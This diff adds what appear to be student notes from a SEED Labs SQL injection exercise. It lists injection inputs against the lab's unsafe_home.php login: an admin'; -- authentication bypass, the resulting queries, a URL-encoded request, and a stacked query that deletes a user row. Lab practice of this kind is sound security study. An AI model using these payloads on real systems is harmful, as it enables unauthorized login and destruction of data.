@@ -1,0 +1,12 @@
+admin'; -- 
+
+SELECT * FROM credential WHERE name= 'admin'; -- ' and Password='aasdas'
+
+'www.SeedLabSQLInjection.com/unsafe_home.php?username=admin%27%3b%20%2d%2d%20&Password=111' > tmp.html
+
+INSERT INTO credential (ID, Name, EID, Password) VALUES ('1901', 'victim', '1901', 'whatever');
+
+admin'; DELETE FROM credential WHERE name='victim'; -- 
+
+
+SELECT * FROM credential WHERE name= 'admin'; DELETE FROM credential WHERE name='victim'; -- and Password='aasdas'
